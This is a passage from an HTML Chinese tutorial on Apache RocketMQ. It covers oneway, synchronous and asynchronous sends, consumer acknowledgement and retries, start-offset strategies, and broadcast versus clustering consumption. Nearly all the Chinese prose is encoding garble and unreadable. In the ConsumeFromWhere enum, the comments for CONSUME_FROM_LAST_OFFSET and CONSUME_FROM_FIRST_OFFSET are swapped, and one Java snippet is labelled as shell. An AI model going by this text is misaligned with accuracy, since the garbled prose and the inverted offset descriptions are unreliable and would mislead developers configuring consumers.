<p><code>sendOneway</code>æ–¹å¼å‘é€æ¶ˆæ¯æœ‰ä¸ªå¥½å¤„å°±æ˜¯æ•ˆç‡é«˜ï¼Œä½†æ˜¯å¦‚æœ Broker æ²¡æ”¶åˆ°çš„æ—¶å€™æ˜¯æ— æ³•è¡¥æ•‘çš„ï¼Œé€‚ç”¨æ—¥å¿—é‡‡é›†è¿™ç§å½¢å¼ã€‚</p>
<h5 data-id="heading-7">2.1.3 åŒæ­¥å‘é€</h5>
<p>åŒæ­¥å‘é€ä¹‹åä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç­‰å¾… Broker å“åº”ï¼Œç›´åˆ°å¾—åˆ°å“åº”ï¼Œå¼€å‘å¯ä»¥é€šè¿‡è·å–çš„ç»“æœå»åšå…¶ä»–å¤„ç†ï¼Œå¦‚æœå‘é€å¤±è´¥å¯ä»¥è¿›è¡Œè¡¥æ•‘ï¼Œæ¯”å¦‚é‡å‘æˆ–è€…å‘Šè­¦ä¹‹ç±»ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">// åŒæ­¥å‘é€ï¼ˆæœ‰ç¡®è®¤ï¼‰
SendResult sendResult = producer.send(message);
System.out.println("å‘é€çŠ¶æ€ï¼š" + sendResult.getSendStatus()); // SEND_OK
</code></pre>
<p>SendResult æ˜¯ Broker è¿”å›çš„ä¿¡æ¯ï¼Œå¯ä»¥æŸ¥çœ‹çŠ¶æ€æ˜¯å¦æˆåŠŸã€‚é‡Œé¢æœ‰ <code>SendStatus</code>ï¼Œç”¨æ¥è¡¨ç¤ºå‘é€çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">SendStatus</span> {
    SEND_OK,
    FLUSH_DISK_TIMEOUT,
    FLUSH_SLAVE_TIMEOUT,
    SLAVE_NOT_AVAILABLE;

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">SendStatus</span><span class="hljs-params">()</span> {
    }
}
</code></pre>
<p>è¿™ä¸ªæšä¸¾çš„è¯´æ˜å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>SEND_OK</strong>: å‘é€æˆåŠŸï¼Œæ¶ˆæ¯å·²æŒä¹…åŒ–åˆ°Broker</li>
<li><strong>FLUSH_DISK_TIMEOUT</strong>: åˆ·ç›˜è¶…æ—¶ï¼ˆåŒæ­¥åˆ·ç›˜æ¨¡å¼ï¼‰</li>
<li><strong>FLUSH_SLAVE_TIMEOUT</strong>: åŒæ­¥åˆ°Slaveè¶…æ—¶ï¼ˆä¸»ä»æ¨¡å¼ï¼‰</li>
<li><strong>SLAVE_NOT_AVAILABLE</strong>: Slaveä¸å¯ç”¨</li>
</ul>
<blockquote>
<p>ä½†æ˜¯æ­¤æ—¶è¦æ³¨æ„ï¼Œå¦‚æœBrokerç«¯è¿”å›çš„SendStatusä¸æ˜¯SEND_OKï¼Œä¹Ÿå¹¶ä¸è¡¨ç¤ºæ¶ˆæ¯å°±â¼€å®šä¸ä¼šæ¨é€ç»™ä¸‹æ¸¸çš„æ¶ˆè´¹è€…ã€‚ä»…ä»…åªæ˜¯è¡¨ç¤ºBrokerç«¯å¹¶æ²¡æœ‰å®Œå…¨æ­£ç¡®çš„å¤„ç†è¿™äº›æ¶ˆæ¯ã€‚å› æ­¤ï¼Œå¦‚æœè¦é‡æ–°å‘é€æ¶ˆæ¯ï¼Œæœ€å¥½è¦å¸¦ä¸Šå”¯â¼€çš„ç³»ç»Ÿæ ‡è¯†ï¼Œè¿™æ ·åœ¨æ¶ˆè´¹è€…ç«¯ï¼Œæ‰èƒ½â¾ƒâ¾åšå¹‚ç­‰åˆ¤æ–­ã€‚ä¹Ÿå°±æ˜¯â½¤å…·æœ‰ä¸šåŠ¡å«ä¹‰çš„OrderIDè¿™æ ·çš„å­—æ®µæ¥åˆ¤æ–­æ¶ˆæ¯æœ‰æ²¡æœ‰è¢«é‡å¤å¤„ç†ã€‚</p>
</blockquote>
<p>åŒæ­¥çš„å¯èƒ½ä¼šå¯¼è‡´å‘é€è€—æ—¶æ¯”è¾ƒé•¿ï¼Œå½±å“åç»­é€»è¾‘ã€‚</p>
<h5 data-id="heading-8">2.1.4 å¼‚æ­¥å‘é€</h5>
<p>å¼‚æ­¥å‘é€æœºåˆ¶ä¸‹ï¼Œâ½£äº§è€…åœ¨å‘Brokerå‘é€æ¶ˆæ¯æ—¶ï¼Œä¼šåŒæ—¶æ³¨å†Œâ¼€ä¸ªå›è°ƒå‡½æ•°ã€‚æ¥ä¸‹æ¥â½£äº§è€…å¹¶ä¸ç­‰å¾…Brokerçš„å“åº”ã€‚å½“Brokerç«¯æœ‰å“åº”æ•°æ®è¿‡æ¥æ—¶ï¼Œâ¾ƒåŠ¨è§¦å‘å›è°ƒå‡½æ•°è¿›â¾å¯¹åº”çš„å¤„ç†ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//  å¼‚æ­¥å‘é€ï¼ˆå›è°ƒç¡®è®¤ï¼‰</span>
producer.send(message, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SendCallback</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(SendResult sendResult)</span> {
        <span class="hljs-comment">// å‘é€æˆåŠŸå›è°ƒ</span>
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onException</span><span class="hljs-params">(Throwable e)</span> {
        <span class="hljs-comment">// å‘é€å¤±è´¥å›è°ƒ</span>
    }
});
</code></pre>
<p>è¿™ä¸ªå›è°ƒå‡½æ•°æ˜¯ç”¨æ¥å¤„ç†æˆåŠŸä¸å¤±è´¥çš„é€»è¾‘ï¼Œå¦‚æœå¤±è´¥äº†ï¼Œå°±ä¼šæ‰§è¡Œ <code>onException</code>ä»£ç é€»è¾‘ï¼Œå¯ä»¥åœ¨è¿™é‡Œå®šä¹‰å¯¹åº”çš„è¡¥æ•‘æªæ–½ã€‚</p>
<blockquote>
<p>æ³¨ï¼šè§¦å‘äº†SendCallbackçš„onExceptionâ½…æ³•åŒæ ·å¹¶ä¸â¼€å®šå°±è¡¨ç¤ºæ¶ˆæ¯ä¸ä¼šå‘æ¶ˆè´¹è€…æ¨</p>
<p>é€ã€‚å¦‚æœBrokerç«¯è¿”å›å“åº”ä¿¡æ¯å¤ªæ…¢ï¼Œè¶…è¿‡äº†è¶…æ—¶æ—¶é—´ï¼Œä¹Ÿä¼šè§¦å‘ <strong>onException</strong> æ–¹æ³•ã€‚</p>
<p>è¶…æ—¶é»˜è®¤æ˜¯ 3 ç§’ï¼Œé€šè¿‡ <strong>producer.setSendMsgTimeout</strong> å¯ä»¥ä¿®æ”¹ã€‚</p>
</blockquote>
<h4 data-id="heading-9">2.2 æ¶ˆè´¹è€…ç«¯çŠ¶æ€ç¡®è®¤æœºåˆ¶</h4>
<p>æ¶ˆè´¹è€…ç«¯é‡‡ç”¨çŠ¶æ€ç¡®è®¤æœºåˆ¶ä¿è¯æ¶ˆè´¹è€…â¼€å®šèƒ½æ­£å¸¸å¤„ç†å¯¹åº”çš„æ¶ˆæ¯ã€‚æ¶ˆè´¹è€…çš„ç¡®è®¤æœºåˆ¶æ ¸å¿ƒæ˜¯ <strong>æ¶ˆè´¹åç§»é‡ï¼ˆOffsetï¼‰çš„æäº¤</strong> â€”â€”Offset è¡¨ç¤ºæ¶ˆè´¹è€…æ¶ˆè´¹åˆ°é˜Ÿåˆ—çš„å“ªä¸ªä½ç½®ï¼ŒBroker é€šè¿‡ Offset åˆ¤æ–­æ¶ˆæ¯æ˜¯å¦å·²è¢«æ¶ˆè´¹ã€‚ä¹Ÿå°±æ˜¯æ¶ˆè´¹è€…ä¼šè¿”å›ç»“æœç»™ Brokerï¼ŒBrokerç­‰å¾…æ¶ˆè´¹è€…è¿”å›æ¶ˆæ¯å¤„ç†çŠ¶æ€ã€‚</p>
<h5 data-id="heading-10">2.2.1 è‡ªåŠ¨ç¡®è®¤</h5>
<p>åŸç†ï¼šæ¶ˆè´¹çº¿ç¨‹å¤„ç†æ¶ˆæ¯æ—¶å¦‚æœ<strong>æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸</strong>ï¼Œå®¢æˆ·ç«¯ä¼šè‡ªåŠ¨å‘ Broker æäº¤ Offsetï¼ŒBroker æ ‡è®°æ¶ˆæ¯å·²æ¶ˆè´¹ï¼›å¦‚æœæŠ›å‡ºå¼‚å¸¸ï¼Œä¸æäº¤ Offsetï¼ŒBroker ä¼šé‡è¯•è¯¥æ¶ˆæ¯ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šæ‰¹é‡æ¶ˆè´¹æ—¶ï¼Œåªè¦æœ‰ä¸€æ¡æ¶ˆæ¯æ¶ˆè´¹å¤±è´¥ï¼Œæ•´ä¸ªæ‰¹æ¬¡çš„ Offset éƒ½ä¸ä¼šæäº¤ï¼Œä¼šé‡è¯•æ•´ä¸ªæ‰¹æ¬¡ã€‚</p>
</blockquote>
<p>ä»£ç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// PushConsumer - è‡ªåŠ¨ç¡®è®¤ï¼ˆé»˜è®¤ï¼‰</span>
<span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(<span class="hljs-string">"group"</span>);
consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -&gt; {
    <span class="hljs-comment">// ä¸šåŠ¡å¤„ç†</span>
    <span class="hljs-keyword">for</span> (MessageExt msg : msgs) {
        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(msg.getBody()));
    }
    <span class="hljs-comment">// è‡ªåŠ¨è¿”å›CONSUME_SUCCESS</span>
    <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
});
</code></pre>
<h5 data-id="heading-11">2.2.2 æ‰‹åŠ¨ç¡®è®¤</h5>
<p>é€‚ç”¨äºéœ€è¦ç²¾å‡†æ§åˆ¶ç¡®è®¤æ—¶æœºçš„åœºæ™¯ï¼ˆå¦‚æ¶ˆæ¯æ¶ˆè´¹åéœ€å†™å…¥æ•°æ®åº“ï¼Œéœ€ç¡®ä¿æ•°æ®åº“å†™å…¥æˆåŠŸå†ç¡®è®¤ï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ‰‹åŠ¨ç¡®è®¤ç¤ºä¾‹</span>
consumer.registerMessageListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageListenerConcurrently</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ConsumeConcurrentlyStatus <span class="hljs-title function_">consumeMessage</span><span class="hljs-params">(
        List&lt;MessageExt&gt; msgs, 
        ConsumeConcurrentlyContext context
    )</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä¸šåŠ¡å¤„ç†</span>
            processMessages(msgs);
            <span class="hljs-comment">// æ‰‹åŠ¨ç¡®è®¤æˆåŠŸ</span>
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// è¿”å›å¤±è´¥ï¼Œç¨åé‡è¯•</span>
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.RECONSUME_LATER;
        }
    }
});
</code></pre>
<h5 data-id="heading-12">2.2.3 ç¡®è®¤æ¶ˆæ¯çš„å…³é”®</h5>
<p>è¿™ä¸ªè¿”å›å€¼æ˜¯â¼€ä¸ªæšä¸¾å€¼ï¼Œæœ‰ä¸¤ä¸ªé€‰é¡¹ CONSUME_SUCCESS å’Œ RECONSUME_LATERã€‚å¦‚æœæ¶ˆè´¹è€…è¿”å› CONSUME_SUCCESSï¼Œé‚£ä¹ˆæ¶ˆæ¯è‡ªç„¶å°±å¤„ç†ç»“æŸäº†ã€‚ä½†æ˜¯å¦‚æœæ¶ˆè´¹è€…æ²¡æœ‰å¤„ç†æˆåŠŸï¼Œè¿”å›çš„æ˜¯ RECONSUME_LATERï¼ŒBroker å°±ä¼šè¿‡â¼€æ®µæ—¶é—´å†å‘èµ·æ¶ˆæ¯é‡è¯•ã€‚</p>
<p>æ¶ˆè´¹çŠ¶æ€å¦‚ä¸‹ï¼š</p>
<ul>
<li>CONSUME_SUCCESS: æ¶ˆè´¹æˆåŠŸï¼Œæ¶ˆæ¯å°†è¢«åˆ é™¤</li>
<li>RECONSUME_LATER: æ¶ˆè´¹å¤±è´¥ï¼Œç¨åé‡è¯•</li>
</ul>
<p>æ€»çš„æ¥è¯´å°±æ˜¯å¦‚ä¸‹å‡ ç‚¹</p>
<ul>
<li><strong>é‡è¯•æœºåˆ¶</strong>ï¼šæœªç¡®è®¤çš„æ¶ˆæ¯ä¼šè¿›å…¥é‡è¯•é˜Ÿåˆ—ï¼ˆ<code>%RETRY%+æ¶ˆè´¹ç»„å</code>ï¼‰ï¼Œé»˜è®¤é‡è¯• 16 æ¬¡ï¼Œè¶…è¿‡æ¬¡æ•°è¿›å…¥æ­»ä¿¡é˜Ÿåˆ—ï¼ˆ<code>%DLQ%+æ¶ˆè´¹ç»„å</code>ï¼‰ï¼›</li>
<li><strong>Offset å­˜å‚¨</strong>ï¼šBroker å°†æ¶ˆè´¹ç»„ - é˜Ÿåˆ—çš„ Offset å­˜å‚¨åœ¨å†…ç½®ä¸»é¢˜<code>consumerOffse</code>ä¸­ï¼Œå³ä½¿æ¶ˆè´¹è€…é‡å¯ä¹Ÿèƒ½æ¢å¤æ¶ˆè´¹è¿›åº¦ï¼›</li>
<li><strong>é¡ºåºæ¶ˆè´¹ç¡®è®¤</strong>ï¼šé¡ºåºæ¶ˆè´¹é»˜è®¤æ˜¯ â€œæ‰‹åŠ¨ç¡®è®¤å˜ç§â€ï¼Œé€šè¿‡åŠ é”æœºåˆ¶ä¿è¯æ¶ˆè´¹é¡ºåºï¼Œåªæœ‰å½“å‰æ¶ˆæ¯ç¡®è®¤åæ‰ä¼šæ¶ˆè´¹ä¸‹ä¸€æ¡ã€‚</li>
</ul>
<h4 data-id="heading-13">2.3 æ¶ˆè´¹è€…ç«¯è‡ªè¡ŒæŒ‡å®šæ¶ˆè´¹ç‚¹</h4>
<p>Broker ç«¯é€šè¿‡ Consumer è¿”å›çš„çŠ¶æ€æ¥æ¨è¿›æ‰€å±æ¶ˆè´¹è€…ç»„å¯¹åº”çš„ Offsetã€‚RocketMQ å¯ä»¥è®©æ¶ˆè´¹è€…è‡ªè¡Œå®šä¹‰ï¼Œé€šè¿‡è®¾ç½® ConsumeFromWhere ä¸ ConsumeTimestamp æ¥è®¾ç½®æ¶ˆè´¹èµ·å§‹ä½ç½®ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(<span class="hljs-string">"group"</span>);

<span class="hljs-comment">// æ–¹æ³•1ï¼šä»æŒ‡å®šæ—¶é—´ç‚¹å¼€å§‹æ¶ˆè´¹</span>
consumer.setConsumeTimestamp(<span class="hljs-string">"20260101000000"</span>); <span class="hljs-comment">// æ ¼å¼ï¼šyyyyMMddHHmmss</span>

<span class="hljs-comment">// æ–¹æ³•2ï¼šæŒ‡å®šæ¶ˆè´¹èµ·å§‹ä½ç½®ç­–ç•¥</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET); <span class="hljs-comment">// ä»æœ€æ—©å¼€å§‹</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);   <span class="hljs-comment">// ä»æœ€æ–°å¼€å§‹</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_TIMESTAMP);    <span class="hljs-comment">// ä»æŒ‡å®šæ—¶é—´å¼€å§‹</span>
</code></pre>
<p>ConsumeFromWhereï¼šæ¶ˆè´¹ä½ç½®ç­–ç•¥æšä¸¾</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ConsumeFromWhere</span> {
    CONSUME_FROM_LAST_OFFSET,      <span class="hljs-comment">// ä»é˜Ÿåˆ—çš„ç¬¬â¼€æ¡æ¶ˆæ¯å¼€å§‹é‡æ–°æ¶ˆè´¹</span>
    CONSUME_FROM_FIRST_OFFSET,     <span class="hljs-comment">// ä»ä¸Šæ¬¡æ¶ˆè´¹åˆ°çš„åœ°â½…å¼€å§‹ç»§ç»­æ¶ˆè´¹</span>
    CONSUME_FROM_TIMESTAMP         <span class="hljs-comment">// ä»æŸâ¼€ä¸ªæ—¶é—´ç‚¹å¼€å§‹é‡æ–°æ¶ˆè´¹</span>
}
</code></pre>
<p>å¦‚æœé€šè¿‡æ—¶é—´ç‚¹æ¥æŒ‡å®šæ¶ˆè´¹ï¼Œéœ€è¦æŒ‡å®šæ—¶é—´ç‚¹ï¼Œè¿™ä¸ªæ—¶é—´ç‚¹çš„æ ¼å¼ï¼š<code>yyyyMMddHHmmss</code>ã€‚</p>
<h3 data-id="heading-14">3 å¹¿æ’­æ¶ˆæ¯</h3>
<p>åœ¨ rocketmq ä¸­ï¼Œä¸»è¦æœ‰ä¸¤ç§æ¶ˆæ¯çš„æ¶ˆè´¹æ¨¡å¼ï¼Œä¸€ç§æ˜¯é›†ç¾¤æ¶ˆè´¹ï¼Œå¦ä¸€ç§æ˜¯å¹¿æ’­æ¶ˆè´¹ã€‚</p>
<ol>
<li><strong>é›†ç¾¤æ¶ˆè´¹ï¼ˆClusteringï¼‰</strong>ï¼šé»˜è®¤æ¨¡å¼ã€‚åŒä¸€æ¡æ¶ˆæ¯åªä¼šè¢«<strong>åŒä¸€ä¸ªæ¶ˆè´¹è€…ç»„ï¼ˆConsumer Groupï¼‰</strong> ä¸­çš„<strong>ä¸€ä¸ª</strong>æ¶ˆè´¹è€…æ¶ˆè´¹ã€‚å…¶è®¾è®¡ç›®æ ‡æ˜¯å®ç°è´Ÿè½½å‡è¡¡å’Œé«˜å¯ç”¨ï¼Œå¤šä¸ªæ¶ˆè´¹è€…å…±åŒåˆ†æ‹…æ¶ˆæ¯å¤„ç†ä»»åŠ¡ã€‚</li>
<li><strong>å¹¿æ’­æ¶ˆè´¹ï¼ˆBroadcastingï¼‰</strong>ï¼šåŒä¸€æ¡æ¶ˆæ¯ä¼šè¢«<strong>åŒä¸€ä¸ªæ¶ˆè´¹è€…ç»„ä¸­çš„æ¯ä¸€ä¸ª</strong>æ¶ˆè´¹è€…æ¶ˆè´¹ä¸€æ¬¡ã€‚å…¶è®¾è®¡ç›®æ ‡æ˜¯è®©å¤šä¸ªè®¢é˜…è€…éƒ½æ¥æ”¶åˆ°å®Œæ•´çš„æ¶ˆæ¯æµã€‚</li>
</ol>
<p>é›†ç¾¤æ¨¡å¼ä¸‹ï¼Œâ¼€ä¸ªæ¶ˆæ¯ï¼Œåªä¼šè¢«â¼€ä¸ªæ¶ˆè´¹è€…ç»„ä¸­çš„å¤šä¸ªæ¶ˆè´¹è€…å®ä¾‹å…±åŒå¤„ç†â¼€æ¬¡ã€‚â¼´æ’­æ¨¡å¼ä¸‹ï¼Œâ¼€ä¸ªæ¶ˆæ¯ï¼Œåˆ™ä¼šæ¨é€ç»™æ‰€æœ‰æ¶ˆè´¹è€…å®ä¾‹å¤„ç†ï¼Œä¸å†å…³â¼¼æ¶ˆè´¹è€…ç»„ã€‚</p>
<h4 data-id="heading-15">3.1 ç®€å•ä»£ç </h4>
<p>JavaAPI ä»£ç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ï¼ï¼ï¼å…³é”®è®¾ç½®ï¼šå°†æ¶ˆè´¹æ¨¡å¼è®¾ç½®ä¸ºå¹¿æ’­æ¨¡å¼ ï¼ï¼ï¼</span>
consumer.setMessageModel(MessageModel.BROADCASTING);
</code></pre>
<p>æ¶ˆæ¯æ¨¡å‹æšä¸¾æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯é›†ç¾¤å’Œå¹¿æ’­</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">MessageModel</span> {
    BROADCASTING(<span class="hljs-string">"BROADCASTING"</span>),
    CLUSTERING(<span class="hljs-string">"CLUSTERING"</span>);
    <span class="hljs-comment">// ....</span>
}
</code></pre>
<blockquote>
<p><strong>å®ç°æ€è·¯</strong></p>
<p>é»˜è®¤æ¨¡å¼(ä¹Ÿå°±æ˜¯é›†ç¾¤æ¨¡å¼)ä¸‹ï¼ŒBrokerç«¯ä¼šç»™æ¯ä¸ªConsumerGroupç»´æŠ¤â¼€ä¸ªç»Ÿâ¼€çš„Offsetï¼Œè¿™æ ·ï¼Œå½“Consumeræ¥æ‹‰å–æ¶ˆæ¯æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡Offsetä¿è¯â¼€ä¸ªæ¶ˆæ¯ï¼Œåœ¨åŒâ¼€ä¸ªConsumerGroupå†…åªä¼šè¢«æ¶ˆè´¹â¼€æ¬¡ã€‚â½½â¼´æ’­æ¨¡å¼çš„æœ¬è´¨ï¼Œæ˜¯å°†Offsetè½¬ç§»åˆ°Consumerç«¯â¾ƒâ¾ä¿ç®¡ï¼ŒåŒ…æ‹¬Offsetçš„è®°å½•ä»¥åŠæ›´æ–°ï¼Œå…¨éƒ½æ”¾åˆ°å®¢æˆ·ç«¯ã€‚è¿™æ ·Brokeræ¨é€æ¶ˆæ¯æ—¶ï¼Œå°±ä¸å†ç®¡ConsumerGroupï¼Œåªè¦Consumeræ¥æ‹‰å–æ¶ˆæ¯ï¼Œå°±è¿”å›å¯¹åº”çš„æ¶ˆæ¯ã€‚</p>
</blockquote>
<h4 data-id="heading-16">3.2 å·¥ä½œåŸç†</h4>
<p>å‡è®¾ä½ æœ‰ä¸€ä¸ªæ¶ˆè´¹è€…ç»„ <code>MyConsumerGroup</code>ï¼Œå®ƒä¸‹é¢æœ‰ä¸‰ä¸ªæ¶ˆè´¹è€…å®ä¾‹ <code>C1</code>ï¼Œ <code>C2</code>ï¼Œ <code>C3</code>ï¼Œå®ƒä»¬éƒ½è®¢é˜…äº†ä¸»é¢˜ <code>MyTopic</code>ã€‚</p>
<ul>
<li><strong>åœ¨é›†ç¾¤æ¨¡å¼ä¸‹</strong>ï¼šä¸»é¢˜ <code>MyTopic</code> ä¸‹çš„10æ¡æ¶ˆæ¯ä¼šä»¥è´Ÿè½½å‡è¡¡çš„æ–¹å¼ï¼ˆé»˜è®¤ä¸ºè½®è¯¢ï¼‰å¹³å‡åˆ†é…ç»™ <code>C1</code>ï¼Œ <code>C2</code>ï¼Œ <code>C3</code> æ¶ˆè´¹ã€‚æ¯ä¸ªæ¶ˆæ¯åªä¼šè¢«å…¶ä¸­ä¸€ä¸ªå®ä¾‹æ¶ˆè´¹ã€‚</li>
<li><strong>åœ¨å¹¿æ’­æ¨¡å¼ä¸‹</strong>ï¼šä¸»é¢˜ <code>MyTopic</code> ä¸‹çš„æ¯ä¸€æ¡æ¶ˆæ¯ï¼Œéƒ½ä¼šå®Œæ•´åœ°å‘é€ç»™ <code>C1</code>ï¼Œ <code>C2</code>ï¼Œ <code>C3</code> <strong>å„ä¸€ä»½</strong>ã€‚æ¯ä¸ªæ¶ˆè´¹è€…å®ä¾‹éƒ½ä¼šç‹¬ç«‹æ¶ˆè´¹è¿™10æ¡æ¶ˆæ¯ã€‚</li>
</ul>
<pre><code class="hljs language-java" lang="java">é›†ç¾¤æ¨¡å¼ (è´Ÿè½½å‡è¡¡)        å¹¿æ’­æ¨¡å¼ (å…¨é‡å¤åˆ¶)
  Msg1 -&gt; [C1]                Msg1 -&gt; [C1]
  Msg2 -&gt; [C2]                Msg2 -&gt; [C1]
  Msg3 -&gt; [C3]      VS        Msg3 -&gt; [C1]
  Msg4 -&gt; [C1]                ... (ä»¥æ­¤ç±»æ¨ï¼Œæ¯æ¡æ¶ˆæ¯)
                              Msg1 -&gt; [C2]
                              Msg2 -&gt; [C2]
                              ...
                              Msg1 -&gt; [C3]
                              Msg2 -&gt; [C3]
                              ...
</code></pre>
<h4 data-id="heading-17">3.3 æ³¨æ„äº‹é¡¹</h4>
<ol>
<li><strong>æ¶ˆè´¹è¿›åº¦ï¼ˆOffsetï¼‰ç®¡ç†</strong>ï¼š
<ul>
<li><strong>é›†ç¾¤æ¨¡å¼</strong>ï¼šæ¶ˆè´¹è¿›åº¦ç”±Brokerç«¯é›†ä¸­å­˜å‚¨å’Œç®¡ç†ï¼ˆæ–°ç‰ˆï¼‰ï¼Œæ‰€æœ‰æ¶ˆè´¹è€…å®ä¾‹å…±äº«åŒä¸€ä»½è¿›åº¦ã€‚å¦‚æœ <code>C1</code> æ¶ˆè´¹äº† <code>Msg1</code>ï¼Œæ•´ä¸ªç»„å°±è®¤ä¸º <code>Msg1</code> å·²è¢«æ¶ˆè´¹ã€‚</li>
<li><strong>å¹¿æ’­æ¨¡å¼</strong>ï¼š<strong>æ¶ˆè´¹è¿›åº¦å­˜å‚¨åœ¨æ¶ˆè´¹è€…å®ä¾‹æœ¬åœ°</strong>ï¼ˆä¾‹å¦‚æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼‰ã€‚æ¯ä¸ªå®ä¾‹ç‹¬ç«‹ç»´æŠ¤è‡ªå·±çš„æ¶ˆè´¹è¿›åº¦ï¼Œäº’ä¸å½±å“ã€‚<code>C1</code> æ¶ˆè´¹åˆ°å“ªé‡Œï¼Œä¸ <code>C2</code>ã€<code>C3</code> å®Œå…¨æ— å…³ã€‚è¿™æ„å‘³ç€å¦‚æœ <code>C1</code> å®ä¾‹é‡å¯ï¼Œå®ƒä¼šä»è‡ªå·±æœ¬åœ°çš„è®°å½•å¼€å§‹æ¶ˆè´¹ï¼Œè€Œä¸ä¼šä»å…¶ä»–å®ä¾‹çš„è¿›åº¦ç»§ç»­ã€‚</li>
</ul>
</li>
<li><strong>èµ„æºæ¶ˆè€—ä¸æ€§èƒ½</strong>ï¼š
<ul>
<li>å¹¿æ’­æ¨¡å¼ä¸‹ï¼Œç½‘ç»œæµé‡å’ŒBrokerçš„è´Ÿè½½ä¼šæˆå€å¢åŠ ï¼ˆä¸æ¶ˆè´¹è€…å®ä¾‹æ•°é‡æˆæ­£æ¯”ï¼‰ã€‚å‡è®¾æœ‰Nä¸ªå®ä¾‹ï¼Œæ¯æ¡æ¶ˆæ¯ç†è®ºä¸Šä¼šè¢«ä¼ è¾“Næ¬¡ã€‚</li>
<li>æ¯ä¸ªæ¶ˆè´¹è€…å®ä¾‹éƒ½è¦å¤„ç†å…¨é‡æ¶ˆæ¯ï¼Œå¯¹ä¸‹æ¸¸ä¸šåŠ¡ç³»ç»Ÿï¼ˆå¦‚æ•°æ®åº“ï¼‰å¯èƒ½é€ æˆé‡å¤å†™å…¥å‹åŠ›ï¼Œéœ€è¦ä¸šåŠ¡æ–¹è‡ªå·±å¤„ç†å¹‚ç­‰æ€§ã€‚</li>
</ul>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š
<ul>
<li><strong>ç¼“å­˜åˆ·æ–°/åŒæ­¥</strong>ï¼šå¤šä¸ªåº”ç”¨æœåŠ¡å™¨å®ä¾‹éœ€è¦åŒæ—¶åˆ·æ–°æœ¬åœ°ç¼“å­˜ï¼ˆå¦‚å•†å“ä¿¡æ¯å˜æ›´ã€é…ç½®æ›´æ–°ï¼‰ã€‚</li>
<li><strong>äº‹ä»¶é€šçŸ¥</strong>ï¼šä¸€ä¸ªäº‹ä»¶éœ€è¦è§¦å‘æ‰€æœ‰å¾®æœåŠ¡å®ä¾‹çš„æŸä¸ªåŠ¨ä½œï¼ˆå¦‚æ—¥å¿—æ¸…ç†ã€è¿æ¥é‡ç½®ï¼‰ã€‚</li>
<li><strong>æ•°æ®é•œåƒ</strong>ï¼šå¤šä¸ªå¼‚åœ°ç³»ç»Ÿéœ€è¦ç»´æŠ¤ä¸€ä»½ç›¸åŒçš„æ•°æ®å‰¯æœ¬ã€‚</li>
</ul>
</li>
<li><strong>ä¸é€‚ç”¨åœºæ™¯</strong>ï¼š
<ul>
<li><strong>éœ€è¦è´Ÿè½½åˆ†æ‹…å¤„ç†å¤§é‡æ¶ˆæ¯</strong>çš„åœºæ™¯ï¼ˆå¦‚è®¢å•å¤„ç†ã€æ—¥å¿—æ”¶é›†ï¼‰ã€‚æ­¤æ—¶åº”ä½¿ç”¨é›†ç¾¤æ¨¡å¼ã€‚</li>
<li>å¯¹æ¶ˆæ¯å¤„ç†æœ‰ä¸¥æ ¼çš„â€œåªå¤„ç†ä¸€æ¬¡â€è¦æ±‚ï¼Œä¸”ä¸å¸Œæœ›ä¸šåŠ¡å±‚åšå¤æ‚å¹‚ç­‰å¤„ç†çš„åœºæ™¯ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-18">4 è¿‡æ»¤æ¶ˆæ¯</h3>
